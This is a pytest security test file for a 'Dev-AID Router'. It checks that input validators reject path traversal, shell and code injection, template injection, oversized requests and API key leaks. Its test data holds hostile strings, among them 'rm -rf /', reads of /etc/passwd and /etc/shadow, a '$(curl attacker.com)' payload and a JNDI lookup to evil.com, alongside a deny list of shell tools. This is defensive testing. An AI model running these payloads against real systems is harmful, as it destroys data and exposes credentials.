"""
Security tests for Dev-AID Router

Tests for OWASP Top 10 vulnerabilities:
- A03: Injection (SQL, Command, Path Traversal)
- A02: Cryptographic Failures (API key handling)
- A04: Insecure Design (Input validation)
"""

import pytest
import tempfile
from pathlib import Path
from pydantic import ValidationError

from router.validators import ExecuteRequest, SafePath, SubprocessCommand
from router.config_loader import ConfigLoader


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""

    @pytest.mark.parametrize(
        "malicious_path",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "foo/../../etc/shadow",
            "foo/../../../etc/passwd",
            ".../.../etc/passwd",
            "./../..",
            "....//....//etc/passwd",
        ],
    )
    def test_path_traversal_blocked(self, malicious_path):
        """Test that various path traversal attempts are blocked"""
        with pytest.raises(ValidationError, match="traversal|not allowed"):
            SafePath(path=malicious_path, base_dir="/app")

    def test_config_loader_path_validation(self, mock_dev_aid_root):
        """Test that config loader validates paths"""
        config = ConfigLoader(mock_dev_aid_root)

        # Try to load a file with path traversal
        with pytest.raises(ValueError, match="Invalid filename"):
            config._load_json("../../etc/passwd")

    def test_safe_path_containment(self, temp_dir):
        """Test that resolved paths stay within base directory"""
        base = temp_dir / "safe"
        base.mkdir()

        # Create a symlink that tries to escape
        target = temp_dir / "outside.txt"
        target.write_text("sensitive data")

        link = base / "escape"
        try:
            link.symlink_to(target)

            # Should detect that resolved path is outside base
            with pytest.raises(ValidationError, match="traversal"):
                validated = SafePath(path="escape", base_dir=str(base))
                # Force validation
                validated.validate_path_containment()
        except OSError:
            # Symlink creation might fail on some systems
            pytest.skip("Symlink creation not supported")


class TestCommandInjectionPrevention:
    """Test command injection prevention"""

    @pytest.mark.parametrize(
        "injection_attempt",
        [
            "test; rm -rf /",
            "test | cat /etc/passwd",
            "test && whoami",
            "test || evil",
            "test `whoami`",
            "test $(whoami)",
            "test; $(curl attacker.com)",
            "; drop table users; --",
        ],
    )
    def test_command_injection_blocked(self, injection_attempt):
        """Test that command injection attempts are blocked"""
        with pytest.raises(ValidationError, match="shell metacharacters"):
            SubprocessCommand(program="git", args=[injection_attempt])

    def test_subprocess_program_allowlist(self):
        """Test that only allowed programs can be executed"""
        # Allowed programs should work
        allowed = ["git", "python", "python3", "pip", "pip3"]
        for prog in allowed:
            cmd = SubprocessCommand(program=prog, args=["--help"])
            assert cmd.program == prog

        # Dangerous programs should be blocked
        dangerous = ["rm", "bash", "sh", "cmd", "powershell", "curl", "wget"]
        for prog in dangerous:
            with pytest.raises(ValidationError):
                SubprocessCommand(program=prog, args=["test"])


class TestInputSanitization:
    """Test input sanitization and validation"""

    def test_null_byte_injection(self):
        """Test null byte injection prevention"""
        # Null bytes can terminate strings in C and cause security issues
        with pytest.raises(ValidationError, match="Null bytes"):
            ExecuteRequest(request="test\x00injection")

    def test_unicode_normalization(self):
        """Test handling of unicode edge cases"""
        # Various unicode tricks that could bypass validation
        tricky_inputs = [
            "test\u202E",  # Right-to-left override
            "test\uFEFF",  # Zero-width no-break space
            "test\u200B",  # Zero-width space
        ]

        for inp in tricky_inputs:
            # Should accept but normalize
            req = ExecuteRequest(request=inp)
            # Whitespace should be stripped
            assert req.request.strip() != ""

    def test_control_characters(self):
        """Test handling of control characters"""
        # Various control characters
        with pytest.raises(ValidationError):
            SafePath(path="test\r\nfile.txt")

        with pytest.raises(ValidationError):
            SafePath(path="test\x01file.txt")

    @pytest.mark.parametrize(
        "injection_pattern",
        [
            "__import__('os').system('ls')",
            "eval('os.system(\"ls\")')",
            "exec('import os; os.system(\"ls\")')",
            "compile('print(1)', 'test', 'exec')",
        ],
    )
    def test_python_code_injection_detection(self, injection_pattern):
        """Test detection of Python code injection attempts"""
        with pytest.raises(ValidationError, match="unsafe pattern"):
            ExecuteRequest(request=injection_pattern)

    @pytest.mark.parametrize(
        "template_injection",
        [
            "${java:runtime}",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "{{config}}",
            "${7*7}",
        ],
    )
    def test_template_injection_detection(self, template_injection):
        """Test detection of template injection attempts"""
        with pytest.raises(ValidationError, match="unsafe pattern"):
            ExecuteRequest(request=template_injection)


class TestAPIKeyHandling:
    """Test secure API key handling"""

    def test_api_key_not_in_error_messages(self):
        """Test that API keys are not leaked in error messages"""
        from router.api_clients import APIClientError, AnthropicClient

        # Even if we construct a client with a real-looking key,
        # errors should not expose it
        try:
            client = AnthropicClient(
                api_key="sk-ant-secret-key-do-not-leak", model_config={"provider": "anthropic"}
            )
        except Exception as e:
            error_msg = str(e).lower()
            # Error message should not contain the API key
            assert "sk-ant-secret" not in error_msg
            assert "secret-key" not in error_msg

    def test_api_key_validation(self):
        """Test API key format validation"""
        from router.validators import APIKeyConfig

        # Valid API key
        valid = APIKeyConfig(provider="anthropic", api_key="sk-ant-" + "x" * 50)
        assert valid.api_key

        # Invalid: too short
        with pytest.raises(ValidationError):
            APIKeyConfig(provider="anthropic", api_key="short")

        # Invalid: contains control characters
        with pytest.raises(ValidationError):
            APIKeyConfig(provider="anthropic", api_key="sk-ant-key\nmalicious")


class TestDenialOfService:
    """Test DoS prevention"""

    def test_request_size_limit(self):
        """Test that excessively large requests are rejected"""
        huge_request = "A" * 100000  # 100KB
        with pytest.raises(ValidationError):
            ExecuteRequest(request=huge_request)

    def test_context_size_limit(self):
        """Test context size limits"""
        with pytest.raises(ValidationError):
            ExecuteRequest(request="test", context_size=20_000_000)  # 20M tokens - unrealistic

    def test_argument_count_limit(self):
        """Test subprocess argument count limit"""
        too_many_args = ["arg"] * 100
        with pytest.raises(ValidationError):
            SubprocessCommand(program="git", args=too_many_args)


class TestSecureDefaults:
    """Test secure defaults across the application"""

    def test_extra_fields_rejected(self):
        """Test that unexpected fields are rejected (prevent mass assignment)"""
        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            ExecuteRequest(
                request="test", is_admin=True, bypass_security=True  # Should be rejected
            )

    def test_whitespace_normalized(self):
        """Test that whitespace is normalized"""
        req = ExecuteRequest(request="  test  ")
        assert req.request == "test"

    def test_empty_string_rejected(self):
        """Test that empty strings are rejected where inappropriate"""
        with pytest.raises(ValidationError):
            ExecuteRequest(request="")

        with pytest.raises(ValidationError):
            ExecuteRequest(request="   ")  # Only whitespace


class TestErrorHandling:
    """Test that errors don't leak sensitive information"""

    def test_config_error_doesnt_leak_paths(self):
        """Test that config errors don't expose full file paths"""
        with pytest.raises((FileNotFoundError, ValueError)) as exc_info:
            ConfigLoader("/nonexistent/path/that/is/very/long/and/sensitive")

        error_msg = str(exc_info.value)
        # Should not leak full system paths
        assert (
            "/nonexistent/path/that/is/very/long" not in error_msg
            or "Configuration file not found" in error_msg
        )

    def test_validation_errors_are_generic(self):
        """Test that validation errors don't leak implementation details"""
        try:
            ExecuteRequest(request="../../../etc/passwd")
        except ValidationError as e:
            # Should indicate unsafe pattern, not internal validation logic
            assert "unsafe pattern" in str(e).lower()


class TestCryptographicSafety:
    """Test cryptographic safety practices"""

    def test_no_weak_randomness(self):
        """Test that we don't use weak random number generation"""
        # This test documents that we should use secrets module, not random
        # for security-sensitive operations
        import secrets
        import random

        # Generate random token
        token = secrets.token_hex(32)
        assert len(token) == 64  # 32 bytes = 64 hex chars

        # Ensure it's not predictable
        token2 = secrets.token_hex(32)
        assert token != token2

    def test_timing_attack_resistance(self):
        """Test timing attack resistance for sensitive comparisons"""
        import secrets

        # Use secrets.compare_digest for constant-time comparison
        key1 = "secret-key-12345"
        key2 = "secret-key-12345"
        key3 = "secret-key-99999"

        assert secrets.compare_digest(key1, key2)
        assert not secrets.compare_digest(key1, key3)
